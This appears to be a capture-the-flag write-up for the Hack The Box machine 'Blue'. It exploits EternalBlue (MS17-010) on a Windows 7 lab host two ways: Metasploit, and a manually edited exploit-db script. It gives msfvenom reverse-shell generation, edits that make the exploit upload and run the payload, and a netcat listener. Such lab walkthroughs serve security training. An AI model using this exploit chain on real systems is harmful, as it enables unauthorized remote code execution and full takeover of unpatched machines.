## Nmap

Let's start off by running our nmap scan:

![nmap](/assets/img/htb/blue/nmap.png)

Nmap `RPC` and `SMB` open. From running the version and script scan, nmap has told us that `SMB` is running Windows 7 SP1. Many of you may have heard about this exploit that affects Windows 7 SP1 SMB called `EternalBlue` or [CVE-2017-0143](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143). Judging by the box name we can assume we'll be using this exploit.

We can run another nmap scan to see if it is actually vulnerable to this:

![vuln](/assets/img/htb/blue/vuln.png)

As you can see, this is vulnerable to `ms17-010`.

## Exploit

We can do this two ways... Manually or the Metasploit way. Let's do it the Metsploit way first.

First spin up Metasploit, type `msfconsole` in your terminal. Then search for ms17-010:

![metasploit](/assets/img/htb/blue/metasploit.png)

We'll use `ms17_010_eternalblue` option, so you can either type `use 2` or `use exploit/windows/smb/ms17_010_eternalblue` up to you.

We'll have to see what options we are working with, so type `show options` or just `options`

![options](/assets/img/htb/blue/options.png)

As you can see all we really need is the `RHOSTS` set, so we'll set our `RHOSTS` to the box IP of `10.10.10.40`.
`set RHOSTS 10.10.10.40`

![rhosts](/assets/img/htb/blue/rhost.png)

Now that we have it set all we have to do now is type `run` or `exploit`

GREAT! Now we have a shell!

![shell](/assets/img/htb/blue/shell.png)

With this exploit, it'll give you instant root access.

![root](/assets/img/htb/blue/root.png)

Your user flag is placed in `C:\Users\haris\Desktop` and root flag is in `C:\Users\Administrator\Desktop`.

## Manual exploit

If we run `searchsploit` on `ms17-010`, we can see we have a few results, the one we want is `42315.py`:

![searchploit](/assets/img/htb/blue/searchsploit.png)

We'll want to get the exploit, we can run `searchsploit -m 42315.py`

We can check if we can login to SMB anonymously, let's list out the shares first: `smbclient -L \\10.10.10.40 -N`

`-L - List shares`

`-N - No password set`

![shares](/assets/img/htb/blue/smb.png)

Looks like we have a `Users` share. And let's try to connect to that share anonymously:
`smbclient \\\\10.10.10.40\\Users -N`

![smb2](/assets/img/htb/blue/smb2.png)

GREAT!

So we know we can connect as guest or anonymously.

The python script we downloaded does not have a built-in reverse shell, so we need to build our own using msfvenom.

`msfvenom -p windows/shell_reverse_tcp LHOST=$TUN0IP LPORT=$PORT -f exe > shell.exe`

NOTE: **DON'T** use the staged payload of `windows/meterpreter/reverse_tcp` as this is a non-metasploit example.

So let's look at our exploit we downloaded from searchsploit, we will need to make modifications to the file.

We'll need to add `//` to our USERNAME variable and just leave the PASSWORD variable the same(blank) as we can sign in as guest.

![USERNAME](/assets/img/htb/blue/username.png)

Scroll down until you find a function called `smb_pwn`.

![smb_pwn](/assets/img/htb/blue/smb_pwn.png)

We will have to uncomment `smb_send_file` and `service_exec`

`smb_send_file - your path to your created payload`

`service_exec - shell to be executed`

So if you called your payload `shell.exe` it would look something like this:

`smb_send_file(smbConn, '/path/to/your/shell/shell.exe', 'C', '/shell.exe')`

`service_exec(conn, r'cmd /c c:\\shell.exe')`

---

#### Note:

When you run your exploit the first time, it'll give an error saying:

![error](/assets/img/htb/blue/mysmb.png)

You'll just have to run this command:

`wget https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/42315.py`
`mv 42315.py.1 mysmb.py`

---

So from here, let's setup our listener:

`nc -lvnp $PORT`

and run our exploit:

`python 42315.py 10.10.10.40`

![root2](/assets/img/htb/blue/root2.png)

There you have it!! ROOT!!
